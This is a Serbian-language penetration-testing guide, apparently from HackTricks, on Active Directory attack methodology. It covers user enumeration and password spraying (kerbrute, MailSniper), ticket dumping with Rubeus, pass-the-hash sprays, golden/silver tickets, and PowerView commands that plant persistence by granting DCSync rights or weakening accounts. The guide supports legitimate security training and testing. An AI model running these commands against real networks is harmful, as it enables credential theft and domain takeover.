# Metodologija Active Directory-a

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja omogućava **network administrators** da efikasno kreiraju i upravljaju **domains**, **users**, i **objects** unutar mreže. Dizajniran je za skaliranje, olakšavajući organizovanje velikog broja korisnika u upravljive **groups** i **subgroups**, dok kontroliše **access rights** na različitim nivoima.

Struktura **Active Directory** se sastoji iz tri primarna sloja: **domains**, **trees**, i **forests**. **Domain** obuhvata kolekciju objekata, kao što su **users** ili **devices**, koji dele zajedničku bazu podataka. **Trees** su grupe tih domena povezane zajedničkom strukturom, a **forest** predstavlja kolekciju više trees, međusobno povezane kroz **trust relationships**, čineći najviši nivo organizacione strukture. Specifična **access** i **communication rights** mogu biti dodeljena na svakom od tih nivoa.

Ključni koncepti unutar **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije vezane za Active Directory objekate.
2. **Object** – Označava entitete unutar direktorijuma, uključujući **users**, **groups**, ili **shared folders**.
3. **Domain** – Služi kao kontejner za directory objekte, pri čemu više domena može koegzistirati unutar **forest**, svaki zadržavajući svoju kolekciju objekata.
4. **Tree** – Grupisanje domena koji dele zajednički root domain.
5. **Forest** – Najviši stepen organizacione strukture u Active Directory, sastavljen od više trees sa **trust relationships** između njih.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa kritičnih za centralizovano upravljanje i komunikaciju unutar mreže. Ovi servisi obuhvataju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **users** i **domains**, uključujući **authentication** i **search** funkcionalnosti.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje sigurnim **digital certificates**.
3. **Lightweight Directory Services** – Podržava directory-enabled aplikacije kroz **LDAP protocol**.
4. **Directory Federation Services** – Pruža **single-sign-on** mogućnosti za autentifikaciju korisnika preko više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti copyright materijala regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Presudna za razrešavanje **domain names**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos autentifikacija**

Da biste naučili kako da **attack an AD** potrebno je vrlo dobro da **razumete** proces **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Brzi pregled

Možete posetiti [https://wadcoms.github.io/](https://wadcoms.github.io) za brz pregled koje komande možete pokrenuti za enumeraciju/eksploataciju AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (bez kredencijala/sesija)

Ako imate pristup AD okruženju ali nemate nikakve kredencijale/sesije, možete:

- **Pentest the network:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **exploit vulnerabilities** ili **extract credentials** iz njih (na primer, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracija DNS-a može dati informacije o ključnim serverima u domenu kao što su web, printers, shares, vpn, media, itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte generalnu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako ovo raditi.
- **Check for null and Guest access on smb services** (ovo neće raditi na modernim Windows verzijama):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič o tome kako enumerisati SMB server možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič o tome kako enumerisati LDAP možete pronaći ovde (posvetite **posebnu pažnju anonimnom pristupu**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sakupite kredencijale [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite hostu [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Sakupite kredencijale **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Ekstrahujte usernames/imena iz internih dokumenata, social media, servisa (pre svega web) unutar domen okruženja kao i iz javno dostupnih izvora.
- Ako pronađete kompletna imena zaposlenih u kompaniji, možete pokušati različite AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonymous SMB/LDAP enum:** Pogledajte stranice za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **invalid username** server će odgovoriti koristeći **Kerberos error** kod _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je username nevažeći. **Valid usernames** će izazvati ili **TGT in a AS-REP** odgovor ili error _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da je korisniku potrebna pre-authentication.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controller-ima. Metod poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa da proveri da li korisnik ili računar postoji bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje možete pronaći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako pronađete jedan od ovih servera u mreži, možete takođe izvršiti **user enumeration against it**. Na пример, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Možete pronaći liste korisničkih imena u [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i u ovoj ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ipak, trebalo bi da imate **imena ljudi koji rade u firmi** iz recon faze koju ste trebali da izvedete pre ovoga. Sa imenom i prezimenom možete koristiti skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) da generišete potencijalna validna korisnička imena.

### Knowing one or several usernames

Ok, dakle već imate važeće korisničko ime ali nemate lozinku... Onda pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **zatražiti AS_REP poruku** za tog korisnika koja će sadržati podatke enkriptovane derivatom korisničke lozinke.
- [**Password Spraying**](password-spraying.md): Pokušajte najčešće lozinke sa svakim otkrivenim korisnikom, možda neki korisnik koristi lošu lozinku (imajte na umu password policy!).
- Imajte u vidu da takođe možete **spray-ovati OWA servers** da pokušate dobiti pristup korisničkim mail serverima.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **dohvatite** neke challenge **hashe** za crack-ovanje tako što ćete poison-ovati neke protokole u **mreži**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više email-ova i bolje razumevanje mreže**. Možda ćete moći da primorate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) da dobijete pristup AD okruženju.

### Steal NTLM Creds

Ako možete **pristupiti drugim PC-jevima ili share-ovima** sa **null ili guest user-om** mogli biste **postaviti fajlove** (npr. SCF fajl) koji, ako budu otvoreni, će **okidač NTLM autentikaciju prema vama** tako da možete **ukrasti** **NTLM challenge** i crack-ovati ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Enumerating Active Directory WITH credentials/session

Za ovu fazu morate imati **kompromitovane kredencijale ili sesiju validnog domain naloga.** Ako imate neke validne kredencijale ili shell kao domain user, **treba da zapamtite da su opcije navedene ranije i dalje validne za kompromitovanje drugih korisnika**.

Pre nego što počnete sa autentifikovanom enumeracijom trebalo bi da znate šta je **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitovanje naloga je **velik korak ka kompromitovanju celog domena**, zato što ćete moći da započnete **Active Directory Enumeration:**

Što se tiče [**ASREPRoast**](asreproast.md) sada možete pronaći sve moguće vulnerable korisnike, a što se tiče [**Password Spraying**](password-spraying.md) možete dobiti **listu svih korisničkih imena** i pokušati lozinku kompromitovanog naloga, prazne lozinke ili nove potencijalne lozinke.

- Možete koristiti [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Takođe možete koristiti [**powershell for recon**](../basic-powershell-for-pentesters/index.html) što će biti stealthier
- Možete takođe [**use powerview**](../basic-powershell-for-pentesters/powerview.md) da izvučete detaljnije informacije
- Još jedan odličan alat za recon u Active Directory je [**BloodHound**](bloodhound.md). Nije **vrlo stealthy** (zavisno od metoda kolekcije koje koristite), ali **ako vas to ne zanima**, obavezno ga isprobajte. Pronađite gde korisnici mogu RDP-ovati, pronađite puteve do drugih grupa, itd.
- **Ostali automatizovani alati za AD enumeraciju su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) jer mogu sadržati interesantne informacije.
- Alat sa GUI koji možete koristiti za enumeraciju directory-ja je **AdExplorer.exe** iz **SysInternal** suite-a.
- Možete pretraživati LDAP bazu sa **ldapsearch** tražeći kredencijale u poljima _userPassword_ & _unixUserPassword_, ili čak u _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristite **Linux**, možete takođe enumerisati domen koristeći [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete takođe pokušati automatizovane alate kao što su:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Ekstrakcija svih domain korisnika**

Veoma je lako dobiti sva korisnička imena domena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ovaj deo Enumeration izgleda kratak, ovo je najvažniji deo od svega. Posetite linkove (pre svega one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne osećate komforno. Tokom assesment-a, ovo će biti ključni trenutak da nađete put do DA ili da odlučite da se ništa ne može uraditi.

### Kerberoast

Kerberoasting uključuje dobijanje **TGS tiketa** koje koriste servisi vezani za korisničke naloge i crack-ovanje njihove enkripcije — koja se bazira na korisničkim lozinkama — **offline**.

Više o tome u:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Kada dobijete neke kredencijale možete proveriti da li imate pristup nekom **mašini**. U tu svrhu možete koristiti **CrackMapExec** da pokušate konekciju na više servera preko različitih protokola, u skladu sa vašim port skenovima.

### Local Privilege Escalation

Ako ste kompromitovali kredencijale ili sesiju kao običan domain user i imate **pristup** tom korisniku na **nekoj mašini u domenu** trebalo bi da pokušate da pronađete način za **lokalno eskaliranje privilegija i loot-ovanje kredencijala**. Samo sa lokalnim administratorskim privilegijama moći ćete **dump-ovati hashe drugih korisnika** u memoriji (LSASS) i lokalno (SAM).

Postoji kompletna stranica u ovoj knjizi o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) i i [**checklist**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Veoma je **neverovatno** da ćete naći **tiket-e** u trenutnom korisniku koji vam daju dozvolu za pristup neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više emailova i bolje razumevanje mreže**. Možda ćete moći da forsirate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Pretraživanje Creds u Computer Shares | SMB Shares

Sada kada imate neke osnovne kredencijale treba da proverite da li možete **naći** neke **interesantne fajlove koji se dele unutar AD**. To možete raditi ručno, ali je veoma dosadan i repetitivan zadatak (još gore ako nađete stotine dokumenata koje treba proveriti).

[**Pratite ovaj link da saznate o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Ukrasti NTLM Creds

Ako možete **pristupiti drugim PC-jevima ili share-ovima** možete **postaviti fajlove** (npr. SCF file) koji, ako se na neki način pristupi njima, će **pokrenuti NTLM autentifikaciju prema vama**, tako da možete **ukrasti** **NTLM challenge** da ga razbijete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala bilo kom autentifikovanom korisniku da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacija privilegija na Active Directory SA privilegovanim kredencijalima/sesijom

**Za sledeće tehnike običan domain korisnik nije dovoljan — potrebne su posebne privilegije/kredencijali da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **kompromitujete neki lokalni admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da izvucite sve hashe iz memorije i lokalno.\
[**Pročitajte ovu stranicu o različitim načinima dobijanja hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti da se **lažno predstavite** kao on.\
Morate koristiti neki alat koji će **izvesti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **inject-ovati** taj **hash** u **LSASS**, tako da kada se izvrši bilo koja **NTLM autentifikacija**, taj **hash će biti upotrebljen.** Poslednja opcija je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **iskoristi korisnikov NTLM hash za zahtev Kerberos tiketa**, kao alternativu uobičajenom Pass The Hash preko NTLM protokola. Dakle, ovo može biti posebno **korisno u mrežama gde je NTLM protokol onemogućen** i gde je dozvoljen samo **Kerberos** kao protokol za autentifikaciju.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **ukradu korisnikov autentifikacioni tiket** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni tiket se potom koristi za **lažno predstavljanje korisnika**, čime se dobija neovlašćen pristup resursima i servisima u mreži.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponovna upotreba kredencijala

Ako imate **hash** ili **password** lokalnog **administratora**, trebalo bi da pokušate da se **lokalno ulogujete** na druge **PC-e** pomoću njega.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi **LAPS** to **ublažio**.

### MSSQL zloupotreba i pouzdani linkovi

Ako korisnik ima privilegije da **pristupi MSSQL instancama**, mogao bi ih iskoristiti da **izvršava komande** na MSSQL hostu (ako se proces izvršava kao SA), **ukrade** NetNTLM **hash** ili čak sprovede **relay** **attack**.\
Takođe, ako je MSSQL instanca pouzdana (database link) od strane druge MSSQL instance, i korisnik ima privilegije nad tom poverenom bazom, moći će da **iskoristi odnos poverenja da izvršava upite i na drugoj instanci**. Ovi trustovi se mogu povezivati i u nekom trenutku korisnik može pronaći pogrešno konfigurisanu bazu gde može izvršavati komande.\
**Linkovi između baza rade čak i preko forest trustova.**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba IT asset/deployment platformi

Third-party inventory i deployment suite često izlažu moćne puteve do kredencijala i izvršavanja koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer object sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domen privilegije na tom računaru, moći ćete da dump-ujete TGTs iz memorije svakog korisnika koji se prijavi na taj računar.\
Dakle, ako se **Domain Admin** prijavi na taj računar, moći ćete da dump-ujete njegov TGT i da ga impersonirate koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation mogli biste čak **automatski kompromitovati Print Server** (nadamo se da će to biti DC).

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljeno "Constrained Delegation", moći će da **impersonira bilo kog korisnika da pristupi nekim servisima na računaru**.\
Zatim, ako **kompromitujete hash** tog korisnika/računara, moći ćete da **impersonirate bilo kog korisnika** (čak i domain admins) da pristupite određenim servisima.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imati **WRITE** privilegiju na Active Directory objektu udaljenog računara omogućava postizanje izvršenja koda sa **povišenim privilegijama**:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zloupotreba Permissions/ACLs

Kompromitovani korisnik može imati neke **interesantne privilegije nad domen objektima** koje bi vam omogućile da kasnije **lateralno se pomerate** ili **escalate** privilegije.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zloupotreba Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domena može se **zloupotrebiti** za **pribavljanje novih kredencijala** i **eskalaciju privilegija**.

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zloupotreba sesija trećih lica

Ako **drugi korisnici** **pristupaju** kompromitovanom računaru, moguće je **sakupljati kredencijale iz memorije** i čak **inject-ovati beacone u njihove procese** kako biste ih impersonirali.\
Obično korisnici pristupaju sistemu preko RDP-a, tako da ovde imate nekoliko napada nad RDP sesijama trećih lica:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **lokalnim Administrator password-om** na računarima priključenim na domen, osiguravajući da je on **nasumičan**, jedinstven i često **menjan**. Ovi passwordi su sačuvani u Active Directory i pristup im je kontrolisan kroz ACL-e samo za autorizovane korisnike. Sa dovoljnim permisijama za pristup ovim lozinkama, pivotovanje na druge računare postaje moguće.

{{#ref}}
laps.md
{{#endref}}

### Krađa sertifikata

**Prikupljanje sertifikata** sa kompromitovanog mašine može biti način za eskalaciju privilegija unutar okruženja:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Zloupotreba Certificate Templates

Ako su konfigurisanе **ranjive templates**, moguće ih je zloupotrebiti za eskalaciju privilegija:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation sa nalogom visokih privilegija

### Dump-ovanje domen kredencijala

Kada dobijete **Domain Admin** ili još bolje **Enterprise Admin** privilegije, možete **dump-ovati** **domen bazu**: _ntds.dit_.

[**Više informacija o DCSync attack se nalazi ovde**](dcsync.md).

[**Više informacija o tome kako ukrasti NTDS.dit možete naći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kao persistentna metoda

Neke od tehnika ranije pomenutih mogu se koristiti za persistenciju.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učiniti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Silver Ticket attack kreira **legitimni Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC account-a**). Ova metoda se koristi za **pristup privilegijama servisa**.

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Golden Ticket attack uključuje napadača koji dobija pristup **NTLM hash-u krbtgt account-a** u Active Directory (AD) okruženju. Ovaj nalog je specijalan zato što se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su bitni za autentikaciju u AD mreži.

Kada napadač dobije ovaj hash, može kreirati **TGTs** za bilo koji nalog koji poželi (Silver ticket attack).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su kao golden tickets, ali izforgeovani na način koji **zaobilazi uobičajene mehanizme detekcije za golden tickets.**

{{#ref}}
diamond-ticket.md
{{#endref}}

### Certificates Account Persistence

**Posedovanje sertifikata naloga ili mogućnost njihovog zahteva** predstavlja vrlo dobar način da se održi persistencija na korisničkom nalogu (čak i ako korisnik promeni lozinku):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### Certificates Domain Persistence

**Korišćenjem sertifikata takođe je moguće održati persistenciju sa visokim privilegijama unutar domena:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

AdminSDHolder objekat u Active Directory osigurava bezbednost **privilegovanih grupa** (kao Domain Admins i Enterprise Admins) primenom standardnog **Access Control List (ACL)** preko ovih grupa da bi se sprečile neautorizovane izmene. Međutim, ova funkcionalnost može se zloupotrebiti; ako napadač izmeni ACL AdminSDHolder-a i da pun pristup običnom korisniku, taj korisnik dobija širok spektar kontrole nad svim privilegovanim grupama. Ova mera, koja je zamišljena da štiti, može se pretvoriti u propust ukoliko se ne prati pažljivo.

[**Više informacija o AdminSDHolder Group ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM kredencijali

Unutar svakog **Domain Controller (DC)** postoji lokalni administrator nalog. Dobijanjem admin prava na takvoj mašini, lokalni Administrator hash se može izvući koristeći **mimikatz**. Nakon toga je potrebna izmena registra da bi se **omogućila upotreba te lozinke**, što omogućava udaljeni pristup lokalnom Administrator nalogu.

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** neke **specijalne permisije** korisniku nad određenim domen objektima koje će tom korisniku omogućiti da **eskalira privilegije u budućnosti**.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** permisija koje **objekat** ima **nad** nekim resursom. Ako možete napraviti čak i **malu izmenu** u **security descriptor-u** objekta, možete dobiti veoma interesantne privilegije nad tim objektom bez potrebe da budete član neke privilegovane grupe.

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da uspostavite **univerzalnu lozinku**, čime dobijate pristup svim domen nalozima.

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati svoj **SSP** da biste **uhvatili** u **clear text** kredencijale koje se koriste za pristup mašini.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD i koristi ga da **push-uje atribute** (SIDHistory, SPNs...) na specificirane objekte **bez** ostavljanja **logova** o **izmenama**. Potrebne su DA privilegije i biti unutar **root domain-a**.\
Napomena: ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo diskutovali kako eskalirati privilegije ako imate **dovoljne permisije da čitate LAPS lozinke**. Međutim, ove lozinke takođe mogu biti korišćene za **održavanje persistencije**.\
Pogledajte:

{{#ref}}
laps.md
{{#endref}}

## Eskalacija privilegija između šuma - Domain Trusts

Microsoft smatra **Forest** kao bezbednosnu granicu. To implicira da **kompromitovanje jednog domena može potencijalno dovesti do kompromitovanja celog Foresta**.

### Osnovne informacije

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji omogućava korisniku iz jednog **domena** da pristupi resursima u drugom **domenu**. On zapravo povezuje autentikacione sisteme ta dva domena, omogućavajući da zahtevi za autentikaciju teku neprimetno. Kada domeni uspostave trust, oni razmenjuju i čuvaju specifične **ključeve** unutar svojih **Domain Controller-a (DCs)** koji su ključni za integritet tog trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain-u**, prvo mora zatražiti specijalan tiket poznat kao **inter-realm TGT** od DC-a svog domena. Ovaj TGT je enkriptovan sa zajedničkim **kljuèem** koji su oba domena dogovorila. Korisnik zatim predaje taj inter-realm TGT **DC-u trusted domain-a** da bi dobio service ticket (**TGS**). Nakon uspešne verifikacije inter-realm TGT-a od strane DC-a trusted domain-a, on izdaje TGS koji korisniku omogućava pristup servisu.

**Koraci**:

1. **Klijent računar** u **Domain 1** započinje proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim zahteva **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan sa **trust key** koji su DC1 i DC2 podelili kao deo dvosmernog domain trusta.
5. Klijent nosi inter-realm TGT DC-u **Domain 2 (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći svoj shared trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kojem klijent želi pristupiti.
7. Konačno, klijent predaje ovaj TGS serveru, koji je enkriptovan sa hash-om serverovog naloga, da bi dobio pristup servisu u Domain 2.

### Različiti trustovi

Važno je napomenuti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernom režimu, oba domena veruju jedan drugom, ali u **jednosmernoj** trust relaciji jedan od domena će biti **trusted**, a drugi **trusting** domen. U tom poslednjem slučaju, **moći ćete pristupiti resursima samo unutar trusting domena iz trusted domena**.

Ako Domain A trust-uje Domain B, A je trusting domen, a B je trusted. Nadalje, u **Domain A**, ovo bi bio **Outbound trust**; a u **Domain B**, ovo bi bio **Inbound trust**.

**Različiti tipovi odnosа poverenja**

